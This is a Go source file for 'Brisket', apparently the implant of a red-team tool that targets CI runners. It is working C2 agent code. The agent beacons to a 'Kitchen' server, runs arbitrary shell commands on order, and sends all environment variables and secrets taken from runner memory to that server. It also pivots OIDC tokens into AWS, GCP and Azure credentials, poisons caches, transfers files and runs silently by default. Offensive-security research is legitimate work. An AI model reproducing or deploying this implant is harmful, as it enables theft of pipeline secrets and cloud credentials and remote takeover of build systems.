// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

// Package brisket implements the implant/agent that runs on target systems.
// In deli terms: The Brisket is the meat being smoked in the runner.
package brisket

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

// Config holds configuration for the Brisket agent.
type Config struct {
	// KitchenURL is the C2 server URL.
	KitchenURL string

	// SessionID links this agent to a session/campaign.
	SessionID string

	// AgentID is the agent identifier (if empty, generates random).
	AgentID string

	// AgentToken is the authentication token for Kitchen requests.
	AgentToken string

	CallbackID   string
	CallbackMode string

	// BeaconInterval is how often to check in with the Kitchen.
	BeaconInterval time.Duration

	MaxOffline time.Duration

	// DwellTime is how long to stay active for interactive commands.
	// Used with express mode: 0=run once, >0=run for this duration.
	DwellTime time.Duration

	CachePoisonConfig string

	// HTTPTimeout is the timeout for HTTP requests.
	HTTPTimeout time.Duration

	// CommandTimeout is the timeout for command execution.
	// Prevents hung commands from blocking the agent loop.
	CommandTimeout time.Duration

	// HTTPClient allows injecting a custom HTTP client for testing.
	HTTPClient *http.Client

	// Silent disables all logging output (stealth mode).
	Silent bool
}

// DefaultConfig returns a Config with sensible defaults.
func DefaultConfig() Config {
	return Config{
		KitchenURL:     "http://localhost:8080",
		SessionID:      "",
		BeaconInterval: 30 * time.Second,
		MaxOffline:     0,
		HTTPTimeout:    30 * time.Second,
		CommandTimeout: 5 * time.Minute,
		Silent:         true,
	}
}

// CloudCredentials stores credentials from the last successful OIDC pivot.
type CloudCredentials struct {
	Provider       string
	AccessToken    string
	AccessKeyID    string
	SecretKey      string
	SessionToken   string
	Region         string
	Project        string
	SubscriptionID string
	TenantID       string
	ClientID       string
	RawToken       string
}

// Agent is the Brisket implant.
type Agent struct {
	config            Config
	agentID           string
	client            *http.Client
	hostname          string
	startTime         time.Time
	cloudCreds        *CloudCredentials
	lastOIDC          *OIDCToken
	cachePoison       *models.CachePoisonStatus
	dumpRunnerSecrets func() *MemDumpResult
}

// New creates a new Brisket agent.
func New(config Config) *Agent {
	if config.Silent {
		slog.SetDefault(slog.New(slog.NewTextHandler(io.Discard, nil)))
	}
	client := config.HTTPClient
	if client == nil {
		client = &http.Client{Timeout: config.HTTPTimeout}
	}
	agentID := config.AgentID
	if agentID == "" {
		agentID = generateAgentID()
	}
	agent := &Agent{
		config:    config,
		agentID:   agentID,
		client:    client,
		hostname:  getHostname(),
		startTime: time.Now().UTC(),
	}
	agent.dumpRunnerSecrets = agent.DumpRunnerSecrets
	return agent
}

// AgentID returns the agent's identifier.
func (a *Agent) AgentID() string {
	return a.agentID
}

// Run starts the agent's main loop.
func (a *Agent) Run(ctx context.Context) error {
	slog.Info("brisket agent started", "agent_id", a.agentID)
	lastContact := time.Now()

	if err := a.beacon(ctx); err != nil {
		slog.Warn("initial beacon failed", "error", err)
		if a.maxOfflineExceeded(lastContact) {
			slog.Info("max offline window exceeded, shutting down", "agent_id", a.agentID)
			return nil
		}
	} else {
		lastContact = time.Now()
	}

	ticker := time.NewTicker(a.config.BeaconInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			slog.Info("brisket agent shutting down")
			return ctx.Err()
		case <-ticker.C:
			if err := a.beacon(ctx); err != nil {
				slog.Warn("beacon failed", "error", err)
				if a.maxOfflineExceeded(lastContact) {
					slog.Info("max offline window exceeded, shutting down", "agent_id", a.agentID)
					return nil
				}
				continue
			}
			lastContact = time.Now()

			orders, err := a.poll(ctx)
			if err != nil {
				slog.Warn("poll failed", "error", err)
				if a.maxOfflineExceeded(lastContact) {
					slog.Info("max offline window exceeded, shutting down", "agent_id", a.agentID)
					return nil
				}
				continue
			}
			lastContact = time.Now()

			for _, order := range orders {
				a.executeOrder(ctx, order)
			}
		}
	}
}

func (a *Agent) maxOfflineExceeded(lastContact time.Time) bool {
	if a.config.MaxOffline <= 0 {
		return false
	}
	return time.Since(lastContact) >= a.config.MaxOffline
}

// RunOnce performs a single beacon and command execution cycle (Smash & Grab mode).
func (a *Agent) RunOnce(ctx context.Context) error {
	slog.Info("brisket agent express mode", "agent_id", a.agentID)

	if err := a.executeCachePoison(ctx); err != nil {
		slog.Warn("cache poison failed", "error", err)
	}
	envData := a.gatherEnvironment()
	if err := a.sendData(ctx, envData); err != nil {
		return fmt.Errorf("failed to send data: %w", err)
	}
	a.emitLogMarkers(envData)

	slog.Info("express mode complete")
	return nil
}

// RunWithDwell runs the agent for a specified duration, then exits.
// Used for interactive commands that need the agent to stay active.
func (a *Agent) RunWithDwell(ctx context.Context, duration time.Duration) error {
	slog.Info("brisket agent dwell mode", "agent_id", a.agentID, "dwell", duration)

	if err := a.executeCachePoison(ctx); err != nil {
		slog.Warn("cache poison failed", "error", err)
	}
	envData := a.gatherEnvironment()
	if err := a.sendData(ctx, envData); err != nil {
		return fmt.Errorf("failed to send initial data: %w", err)
	}
	a.emitLogMarkers(envData)

	dwellCtx, cancel := context.WithTimeout(ctx, duration)
	defer cancel()

	interval := a.config.BeaconInterval
	if interval > 3*time.Second {
		interval = 3 * time.Second
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-dwellCtx.Done():
			slog.Info("dwell time expired, shutting down")
			return nil
		case <-ticker.C:
			if err := a.beacon(ctx); err != nil {
				slog.Warn("beacon failed", "error", err)
				continue
			}

			orders, err := a.poll(ctx)
			if err != nil {
				slog.Warn("poll failed", "error", err)
				continue
			}

			for _, order := range orders {
				a.executeOrder(ctx, order)
			}
		}
	}
}

// beacon sends a heartbeat to the Kitchen.
func (a *Agent) beacon(ctx context.Context) error {
	payload := map[string]any{
		"agent_id":   a.agentID,
		"session_id": a.config.SessionID,
		"hostname":   a.hostname,
		"os":         runtime.GOOS,
		"arch":       runtime.GOARCH,
		"pid":        os.Getpid(),
		"uptime":     time.Since(a.startTime).Seconds(),
	}
	if a.config.CallbackID != "" {
		payload["callback_id"] = a.config.CallbackID
	}
	if a.config.CallbackMode != "" {
		payload["callback_mode"] = a.config.CallbackMode
	}

	data, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal beacon: %w", err)
	}

	return a.sendData(ctx, data)
}

// poll checks for pending orders from the Kitchen.
func (a *Agent) poll(ctx context.Context) ([]*models.Order, error) {
	url := fmt.Sprintf("%s/b/%s", a.config.KitchenURL, a.agentID)

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, http.NoBody)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	if a.config.AgentToken != "" {
		req.Header.Set("X-Agent-Token", a.config.AgentToken)
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to poll: %w", err)
	}
	defer resp.Body.Close()

	// Handle 204 No Content - no orders pending
	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}

	// Handle 200 OK - single order returned (not wrapped in array)
	if resp.StatusCode == http.StatusOK {
		var order models.Order
		if err := json.NewDecoder(resp.Body).Decode(&order); err != nil {
			return nil, fmt.Errorf("failed to decode order: %w", err)
		}
		return []*models.Order{&order}, nil
	}

	return nil, fmt.Errorf("poll returned status %d", resp.StatusCode)
}

// sendData sends data to the Kitchen.
func (a *Agent) sendData(ctx context.Context, data []byte) error {
	url := fmt.Sprintf("%s/b/%s", a.config.KitchenURL, a.agentID)

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/json")
	if a.config.AgentToken != "" {
		req.Header.Set("X-Agent-Token", a.config.AgentToken)
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send data: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body := readResponseBody(resp.Body, 1024)
		return fmt.Errorf("server returned status %d: %s", resp.StatusCode, body)
	}

	return nil
}

type logMarkerState struct {
	MemdumpAttempted bool              `json:"memdump_attempted"`
	MemdumpError     string            `json:"memdump_error"`
	MemdumpCount     int               `json:"memdump_count"`
	RunnerVars       []string          `json:"runner_vars"`
	RunnerEndpoints  []json.RawMessage `json:"runner_endpoints"`
}

func (a *Agent) emitLogMarkers(envData []byte) {
	if a.config.CallbackID == "" {
		return
	}

	var state logMarkerState
	if err := json.Unmarshal(envData, &state); err != nil {
		return
	}
	callbackHash := markerHash(a.config.CallbackID)
	agentHash := markerHash(a.agentID)
	if state.MemdumpAttempted && state.MemdumpError == "" {
		fmt.Printf("smokedmeat.exec.v1 callback_hash=%s agent_hash=%s memdump=%d vars=%d endpoints=%d\n",
			callbackHash,
			agentHash,
			state.MemdumpCount,
			len(state.RunnerVars),
			len(state.RunnerEndpoints),
		)
	}
	fmt.Printf("smokedmeat.upload.v1 callback_hash=%s agent_hash=%s\n", callbackHash, agentHash)
}

func markerHash(value string) string {
	sum := sha256.Sum256([]byte(value))
	return hex.EncodeToString(sum[:8])
}

// setMarshaledOutput is a helper that sets marshaled data on the coleslaw.
// If marshaling failed (err != nil), it sets an error on the coleslaw instead.
func setMarshaledOutput(coleslaw *models.Coleslaw, data []byte, err error) {
	if err != nil {
		coleslaw.SetError(fmt.Errorf("failed to marshal result: %w", err))
	} else {
		coleslaw.SetOutput(data, nil, 0)
	}
}

func (a *Agent) storeCloudCreds(result *models.PivotResult) {
	if result == nil || !result.Success || result.RawCredentials == nil {
		return
	}

	creds := &CloudCredentials{Provider: result.Provider}
	raw := result.RawCredentials

	switch strings.ToLower(result.Provider) {
	case "aws":
		creds.AccessKeyID = raw["AWS_ACCESS_KEY_ID"]
		creds.SecretKey = raw["AWS_SECRET_ACCESS_KEY"]
		creds.SessionToken = raw["AWS_SESSION_TOKEN"]
		creds.Region = raw["AWS_DEFAULT_REGION"]
	case "gcp", "google":
		creds.AccessToken = raw["ACCESS_TOKEN"]
		creds.Project = raw["PROJECT"]
	case "azure", "az":
		creds.AccessToken = raw["ACCESS_TOKEN"]
		creds.TenantID = raw["TENANT_ID"]
		creds.ClientID = raw["CLIENT_ID"]
		creds.SubscriptionID = raw["SUBSCRIPTION_ID"]
		if a.lastOIDC != nil {
			creds.RawToken = a.lastOIDC.RawToken
		}
	}

	a.cloudCreds = creds
}

// executeOrder executes a single order and sends the response.
func (a *Agent) executeOrder(ctx context.Context, order *models.Order) {
	coleslaw := models.NewColeslaw(order.OrderID, order.SessionID, a.agentID)

	timeout := a.config.CommandTimeout
	if timeout <= 0 {
		timeout = 5 * time.Minute
	}

	execCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	done := make(chan struct{})
	go func() {
		defer close(done)
		a.executeOrderInner(execCtx, order, coleslaw)
	}()

	select {
	case <-done:
	case <-execCtx.Done():
		select {
		case <-done:
		default:
			if execCtx.Err() == context.DeadlineExceeded {
				coleslaw.SetError(fmt.Errorf("command timed out after %v", timeout))
				slog.Warn("command execution timed out", "order_id", order.OrderID, "command", order.Command)
			}
		}
	}

	data, err := coleslaw.Marshal()
	if err != nil {
		slog.Error("failed to marshal coleslaw", "order_id", order.OrderID, "error", err)
		return
	}

	if err := a.sendData(ctx, data); err != nil {
		slog.Error("failed to send coleslaw", "order_id", order.OrderID, "error", err)
	}
}

// executeOrderInner contains the actual command execution logic.
func (a *Agent) executeOrderInner(ctx context.Context, order *models.Order, coleslaw *models.Coleslaw) {
	switch order.Command {
	case "exec":
		stdout, stderr, exitCode := a.execCommand(ctx, order.Args)
		coleslaw.SetOutput(stdout, stderr, exitCode)

	case "env":
		envData := a.gatherEnvironment()
		coleslaw.SetOutput(envData, nil, 0)

	case "recon":
		reconResult := a.Recon()
		data, err := reconResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "cloud-query":
		result := a.executeCloudQuery(ctx, order.Args)
		data, err := json.Marshal(result)
		setMarshaledOutput(coleslaw, data, err)

	case "oidc":
		if len(order.Args) > 0 && order.Args[0] == "pivot" {
			provider := "auto"
			var pivotArgs []string
			if len(order.Args) > 1 {
				provider = order.Args[1]
			}
			if len(order.Args) > 2 {
				pivotArgs = order.Args[2:]
			}
			pivotResult, err := a.OIDCPivot(provider, pivotArgs)
			if pivotResult == nil {
				coleslaw.SetError(fmt.Errorf("OIDC pivot failed: %w", err))
			} else {
				exitCode := 0
				if err != nil || !pivotResult.Success {
					exitCode = 1
				}
				a.storeCloudCreds(pivotResult)
				pivotData, err := json.Marshal(pivotResult)
				if err != nil {
					coleslaw.SetError(fmt.Errorf("failed to marshal result: %w", err))
				} else {
					coleslaw.SetOutput(pivotData, nil, exitCode)
				}
			}
		} else {
			audience := getArgOrEnv(order.Args, "audience", "")
			token, err := a.OIDC(audience)
			if err != nil {
				coleslaw.SetError(fmt.Errorf("OIDC extraction failed: %w", err))
			} else {
				tokenData, err := json.Marshal(token)
				setMarshaledOutput(coleslaw, tokenData, err)
			}
		}

	case "transfer":
		transferResult := a.Transfer(order.Args)
		data, err := transferResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "upload":
		args := append([]string{"upload"}, order.Args...)
		transferResult := a.Transfer(args)
		data, err := transferResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "download":
		args := append([]string{"download"}, order.Args...)
		transferResult := a.Transfer(args)
		data, err := transferResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "ls":
		args := append([]string{"list"}, order.Args...)
		transferResult := a.Transfer(args)
		data, err := transferResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "token-test":
		tokenResult := a.TestToken(order.Args)
		data, err := tokenResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "napkin":
		napkinResult := a.Napkin(order.Args)
		data, err := napkinResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "scan":
		scanResult := a.Scan(order.Args)
		data, err := scanResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "inject":
		injectResult := a.Inject(order.Args)
		data, err := injectResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	case "lotp":
		lotpResult := a.LOTP(order.Args)
		data, err := lotpResult.Marshal()
		setMarshaledOutput(coleslaw, data, err)

	default:
		coleslaw.SetError(fmt.Errorf("unknown command: %s", order.Command))
	}
}

// execCommand executes a shell command.
func (a *Agent) execCommand(ctx context.Context, args []string) (stdout, stderr []byte, exitCode int) {
	if len(args) == 0 {
		return nil, []byte("no command specified"), 1
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", append([]string{"/C"}, args...)...)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", strings.Join(args, " "))
	}

	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	err := cmd.Run()
	stdout = stdoutBuf.Bytes()
	stderr = stderrBuf.Bytes()

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}
	}

	return stdout, stderr, exitCode
}

// gatherEnvironment collects environment information and runner secrets.
func (a *Agent) gatherEnvironment() []byte {
	info := map[string]any{
		"agent_id":   a.agentID,
		"session_id": a.config.SessionID,
		"hostname":   a.hostname,
		"os":         runtime.GOOS,
		"arch":       runtime.GOARCH,
		"pid":        os.Getpid(),
		"ppid":       os.Getppid(),
		"uid":        os.Getuid(),
		"gid":        os.Getgid(),
		"cwd":        getCwd(),
		"env":        getFilteredEnv(),
		"timestamp":  time.Now().UTC().Format(time.RFC3339),
	}
	if a.config.CallbackID != "" {
		info["callback_id"] = a.config.CallbackID
	}
	if a.config.CallbackMode != "" {
		info["callback_mode"] = a.config.CallbackMode
	}
	if a.cachePoison != nil {
		info["cache_poison"] = a.cachePoison
	}

	info["goos"] = runtime.GOOS
	if runtime.GOOS == "linux" {
		info["memdump_attempted"] = true
		memdump := a.DumpRunnerSecrets()
		if len(memdump.Secrets) > 0 && len(memdump.Vars) == 0 && len(memdump.Endpoints) == 0 {
			for attempt := 0; attempt < 3; attempt++ {
				time.Sleep(2 * time.Second)
				retry := a.DumpRunnerSecrets()
				if len(retry.Vars) > 0 || len(retry.Endpoints) > 0 {
					memdump.Vars = retry.Vars
					memdump.Endpoints = retry.Endpoints
					break
				}
			}
		}
		info["memdump_error"] = memdump.Error
		info["memdump_pid"] = memdump.ProcessID
		info["memdump_count"] = len(memdump.Secrets)
		info["memdump_regions"] = memdump.RegionsScanned
		info["memdump_bytes"] = memdump.BytesRead
		info["memdump_read_errors"] = memdump.ReadErrors
		if memdump.Error == "" && len(memdump.Secrets) > 0 {
			info["runner_secrets"] = memdump.Secrets
			info["runner_pid"] = memdump.ProcessID
		}
		if len(memdump.Vars) > 0 {
			info["runner_vars"] = memdump.Vars
		}
		if len(memdump.Endpoints) > 0 {
			info["runner_endpoints"] = memdump.Endpoints
		}
	} else {
		info["memdump_attempted"] = false
	}

	data, _ := json.MarshalIndent(info, "", "  ")
	return data
}

// generateAgentID creates a random agent ID.
func generateAgentID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("brisket-%d", time.Now().UnixNano())
	}
	return fmt.Sprintf("brisket-%s", hex.EncodeToString(b))
}

// getHostname returns the system hostname.
func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

// getCwd returns the current working directory.
func getCwd() string {
	cwd, err := os.Getwd()
	if err != nil {
		return "unknown"
	}
	return cwd
}

// getFilteredEnv returns environment variables for exfiltration.
func getFilteredEnv() map[string]string {
	env := make(map[string]string)
	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) == 2 {
			env[parts[0]] = parts[1]
		}
	}
	return env
}

// readResponseBody reads the response body up to maxBytes, returning what was read.
// On error, returns empty string and logs the error at debug level.
func readResponseBody(body io.Reader, maxBytes int64) string {
	data, err := io.ReadAll(io.LimitReader(body, maxBytes))
	if err != nil {
		slog.Debug("failed to read response body", "error", err)
		return ""
	}
	return string(data)
}
